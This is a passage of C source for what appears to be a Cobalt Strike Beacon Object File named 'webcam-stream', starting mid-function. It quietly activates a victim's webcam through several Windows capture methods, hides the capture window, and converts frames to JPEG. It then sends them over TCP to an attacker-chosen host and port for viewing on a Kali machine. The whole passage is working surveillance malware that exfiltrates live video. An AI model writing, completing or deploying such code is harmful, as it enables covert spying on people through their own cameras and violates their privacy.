    pGetClip = (PFN_GetClipboardData)GetProcAddress(user, "GetClipboardData");
    if (!pCapCreate || !pSendMsg || !pCreateWin || !pDestroyWin || !pOpenClip || !pCloseClip || !pGetClip) {
        BeaconPrintf(CALLBACK_ERROR, "vfw: resolve failed");
        return 0;
    }

    parent = pCreateWin(0x00000080 /* WS_EX_TOOLWINDOW */, "STATIC", "mlcam",
                        0x80000000 /* WS_POPUP */, 0, 0, 4, 4, NULL, NULL, GetModuleHandleA(NULL), NULL);
    if (!parent) {
        BeaconPrintf(CALLBACK_ERROR, "vfw: parent window failed");
        return 0;
    }
    if (pShow) pShow(parent, 0);

    cap = pCapCreate("mlcap", 0x40000000 /* WS_CHILD */, 0, 0, 320, 240, parent, 1);
    if (!cap) {
        BeaconPrintf(CALLBACK_ERROR, "vfw: capCreateCaptureWindow failed");
        pDestroyWin(parent);
        return 0;
    }
    if (!pSendMsg(cap, WM_CAP_DRIVER_CONNECT, 0, 0)) {
        /* try driver index 1 */
        if (!pSendMsg(cap, WM_CAP_DRIVER_CONNECT, 1, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "vfw: DRIVER_CONNECT failed");
            pDestroyWin(cap);
            pDestroyWin(parent);
            return 0;
        }
    }
    pSendMsg(cap, WM_CAP_SET_PREVIEW, 0, 0);
    pSendMsg(cap, WM_CAP_SET_OVERLAY, 0, 0);
    pSendMsg(cap, WM_CAP_SET_PREVIEWRATE, 66, 0);

    memset(tmpdir, 0, sizeof(tmpdir));
    pTmp(MAX_PATH, tmpdir);
    MSVCRT$_snprintf(dib, MAX_PATH, "%sml-webcam.bmp", tmpdir);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] vfw grab -> close Kali window to stop");

    for (;;) {
        HBITMAP hb;
        BYTE *jpegData = NULL;
        DWORD jpegSize = 0;
        unsigned char hdr[4];
        LRESULT grabbed;

        grabbed = pSendMsg(cap, WM_CAP_GRAB_FRAME, 0, 0);
        pSendMsg(cap, WM_CAP_EDIT_COPY, 0, 0);
        hb = NULL;
        jpegSize = 0;
        if (pOpenClip(parent)) {
            hb = (HBITMAP)pGetClip(CF_BITMAP);
            if (hb)
                BitmapToJpeg(hb, quality, &jpegData, &jpegSize);
            pCloseClip();
        }
        if (!jpegData || jpegSize < 32) {
            empty++;
            if (empty == 1)
                BeaconPrintf(CALLBACK_OUTPUT, "[-] vfw no frame grab=%ld — close Camera app, unplug USB", (long)grabbed);
            if (jpegData) free(jpegData);
            if (empty > 20) {
                BeaconPrintf(CALLBACK_ERROR, "vfw: camera not producing frames");
                break;
            }
            Sleep(150);
            continue;
        }
        empty = 0;
        hdr[0] = (unsigned char)(jpegSize);
        hdr[1] = (unsigned char)(jpegSize >> 8);
        hdr[2] = (unsigned char)(jpegSize >> 16);
        hdr[3] = (unsigned char)(jpegSize >> 24);
        if (!sock_send_all(sock, (const char *)hdr, 4) ||
            !sock_send_all(sock, (const char *)jpegData, (int)jpegSize)) {
            free(jpegData);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] viewer closed after %d vfw frames", frames);
            break;
        }
        free(jpegData);
        frames++;
        if (frames == 1)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] vfw first jpeg %lu bytes", (unsigned long)jpegSize);
        Sleep((DWORD)interval);
    }

    pSendMsg(cap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
    pDestroyWin(cap);
    pDestroyWin(parent);
    return frames;
}

static SOCK_T tcp_connect(const char *host, int port) {
    char wsa[512];
    SOCKADDR_IN_MIN addr;
    SOCK_T s;
    unsigned long ip;

    memset(wsa, 0, sizeof(wsa));
    if (pWSAStartup(0x0202, wsa) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "WSAStartup failed");
        return (SOCK_T)(~0);
    }
    ip = pInetAddr(host);
    if (ip == 0xFFFFFFFFUL) {
        BeaconPrintf(CALLBACK_ERROR, "inet_addr failed for %s", host);
        return (SOCK_T)(~0);
    }
    s = pSocket(2, 1, 6); /* AF_INET, SOCK_STREAM, IPPROTO_TCP */
    if (s == (SOCK_T)(~0)) {
        BeaconPrintf(CALLBACK_ERROR, "socket failed");
        return s;
    }
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = 2;
    addr.sin_port = pHtons((unsigned short)port);
    addr.sin_addr = ip;
    if (pConnect(s, &addr, sizeof(addr)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "connect %s:%d failed", host, port);
        pClosesocket(s);
        return (SOCK_T)(~0);
    }
    return s;
}

void go(char* buff, int len) {
    datap parser;
    char *host;
    int port, quality, interval;
    HRESULT hr;
    SOCK_T sock;
    CWebcamAccess wa;
    unsigned int width = 0, height = 0;
    int buflen;
    BYTE *buf = NULL;
    BITMAPINFO bmi;
    void *pBits = NULL;
    HBITMAP hBitmap = NULL;
    int frames = 0;
    int fails = 0;
    int mf_live = 1;
    HMODULE hMfplat;

    BeaconDataParse(&parser, buff, len);
    host = BeaconDataExtract(&parser, NULL);
    port = BeaconDataInt(&parser);
    quality = BeaconDataInt(&parser);
    interval = BeaconDataInt(&parser);

    if (!host || !host[0]) {
        BeaconPrintf(CALLBACK_ERROR, "webcam-stream: missing host");
        return;
    }
    if (port < 1 || port > 65535) port = 1338;
    if (quality < 20 || quality > 95) quality = 55;
    if (interval < 50) interval = 200;
    if (interval > 3000) interval = 3000;

    if (!ResolveAPIs()) {
        BeaconPrintf(CALLBACK_ERROR, "ResolveAPIs failed");
        return;
    }
    if (!ResolveGDIs()) {
        BeaconPrintf(CALLBACK_ERROR, "ResolveGDIs failed");
        return;
    }
    if (!ResolveWinsock()) {
        BeaconPrintf(CALLBACK_ERROR, "ResolveWinsock failed");
        return;
    }

    hMfplat = GetModuleHandleA("mfplat.dll");
    if (!hMfplat) hMfplat = LoadLibraryA("mfplat.dll");
    if (hMfplat) {
        pMFStartup = (PFN_MFStartup)GetProcAddress(hMfplat, "MFStartup");
        pMFShutdown = (PFN_MFShutdown)GetProcAddress(hMfplat, "MFShutdown");
        if (pMFStartup) pMFStartup(0x00020070UL, 0);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-stream connect %s:%d q=%d ms=%d", host, port, quality, interval);
    sock = tcp_connect(host, port);
    if (sock == (SOCK_T)(~0)) return;
    if (!sock_send_all(sock, "WCST", 4)) {
        BeaconPrintf(CALLBACK_ERROR, "send magic failed");
        pClosesocket(sock);
        return;
    }

    hr = pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr) && hr != 0x00000001L /* S_FALSE */ && hr != 0x80010106L /* RPC_E_CHANGED_MODE */) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx 0x%08lx", hr);
        pClosesocket(sock);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Initializing webcam");
    CWebcamAccess_Init(&wa);
    hr = CWebcamAccess_Initialize(&wa);
    if (FAILED(hr) || wa.m_cam_devices.count == 0) {
        Sleep(400);
        CWebcamAccess_Destroy(&wa);
        CWebcamAccess_Init(&wa);
        hr = CWebcamAccess_Initialize(&wa);
    }
    if (FAILED(hr) || wa.m_cam_devices.count == 0) {
        BeaconPrintf(CALLBACK_ERROR, "no webcam (close Camera/browser, allow desktop camera privacy)");
        CWebcamAccess_Destroy(&wa);
        pClosesocket(sock);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] try KS UVC (USB 2.0 Camera / MI_00)");
    hr = CWebcamAccess_PrepareKs(&wa);
    if (FAILED(hr)) {
        UINT32 cam;
        BeaconPrintf(CALLBACK_OUTPUT, "[-] KS 0x%08lx — MF enum fallback", hr);
        for (cam = 0; cam < wa.m_cam_devices.count; cam++) {
            wa.m_cam_devices.selection = cam;
            BeaconPrintf(CALLBACK_OUTPUT, "[*] prepare cam %u/%u", cam, wa.m_cam_devices.count);
            hr = CWebcamAccess_PrepareDevice(&wa);
            if (SUCCEEDED(hr))
                break;
        }
    }
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] MF prepare failed — VFW last resort");
        CWebcamAccess_Destroy(&wa);
        mf_live = 0;
        frames = stream_vfw(sock, quality, interval);
        pClosesocket(sock);
        if (pMFShutdown) pMFShutdown();
        BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-stream done frames=%d", frames);
        return;
    }

    CWebcamAccess_GetImageSizes(&wa, &width, &height);
    if (width == 0 || height == 0 || width > 4096 || height > 4096) {
        BeaconPrintf(CALLBACK_ERROR, "bad frame size %u x %u", width, height);
        CWebcamAccess_Destroy(&wa);
        pClosesocket(sock);
        return;
    }
    if (wa.m_mjpg) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] stream MJPG %ux%u passthrough -> close Kali window to stop", width, height);
        for (;;) {
            BYTE *jpegData = NULL;
            DWORD jpegSize = 0;
            unsigned char hdr[4];
            hr = CWebcamAccess_GetJpeg(&wa, &jpegData, &jpegSize);
            if (FAILED(hr) || !jpegData || jpegSize < 32) {
                BeaconPrintf(CALLBACK_OUTPUT, "[-] MJPG ReadSample 0x%08lx", hr);
                if (jpegData) free(jpegData);
                break;
            }
            hdr[0] = (unsigned char)(jpegSize);
            hdr[1] = (unsigned char)(jpegSize >> 8);
            hdr[2] = (unsigned char)(jpegSize >> 16);
            hdr[3] = (unsigned char)(jpegSize >> 24);
            if (!sock_send_all(sock, (const char *)hdr, 4) ||
                !sock_send_all(sock, (const char *)jpegData, (int)jpegSize)) {
                free(jpegData);
                BeaconPrintf(CALLBACK_OUTPUT, "[*] viewer closed after %d frames", frames);
                break;
            }
            free(jpegData);
            frames++;
            Sleep((DWORD)interval);
        }
        CWebcamAccess_Destroy(&wa);
        pClosesocket(sock);
        if (pMFShutdown) pMFShutdown();
        BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-stream done frames=%d", frames);
        return;
    }
    buflen = (int)(width * height * 4);
    buf = (BYTE *)malloc((size_t)buflen);
    if (!buf) {
        CWebcamAccess_Destroy(&wa);
        pClosesocket(sock);
        return;
    }

    memset(&bmi, 0, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = (LONG)width;
    bmi.bmiHeader.biHeight = (LONG)height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    hBitmap = pCreateDIBSection(NULL, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
    if (!hBitmap || !pBits) {
        BeaconPrintf(CALLBACK_ERROR, "CreateDIBSection failed");
        free(buf);
        CWebcamAccess_Destroy(&wa);
        pClosesocket(sock);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] stream %ux%u -> close Kali window to stop", width, height);

    for (;;) {
        BYTE *jpegData = NULL;
        DWORD jpegSize = 0;
        unsigned char hdr[4];

        hr = CWebcamAccess_GetImageData(&wa, buf + (height - 1) * width * 4, (LONG)width * -4);
        if (FAILED(hr)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] MF ReadSample 0x%08lx — fallback VFW", hr);
            if (hBitmap) { DeleteObject(hBitmap); hBitmap = NULL; }
            if (buf) { free(buf); buf = NULL; }
            CWebcamAccess_Destroy(&wa);
            mf_live = 0;
            frames = stream_vfw(sock, quality, interval);
            break;
        }
        fails = 0;
        memcpy(pBits, buf, (size_t)buflen);
        if (!BitmapToJpeg(hBitmap, quality, &jpegData, &jpegSize) || !jpegData || jpegSize < 32) {
            if (jpegData) free(jpegData);
            Sleep((DWORD)interval);
            continue;
        }
        hdr[0] = (unsigned char)(jpegSize);
        hdr[1] = (unsigned char)(jpegSize >> 8);
        hdr[2] = (unsigned char)(jpegSize >> 16);
        hdr[3] = (unsigned char)(jpegSize >> 24);
        if (!sock_send_all(sock, (const char *)hdr, 4) ||
            !sock_send_all(sock, (const char *)jpegData, (int)jpegSize)) {
            free(jpegData);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] viewer closed after %d frames", frames);
            break;
        }
        free(jpegData);
        frames++;
        Sleep((DWORD)interval);
    }

    if (hBitmap) DeleteObject(hBitmap);
    if (buf) free(buf);
    if (mf_live) CWebcamAccess_Destroy(&wa);
    pClosesocket(sock);
    if (pMFShutdown) pMFShutdown();
    BeaconPrintf(CALLBACK_OUTPUT, "[*] webcam-stream done frames=%d", frames);
}





#ifndef BOF
int main(int argc, char* argv[]) {
    return 0;
}
#endif
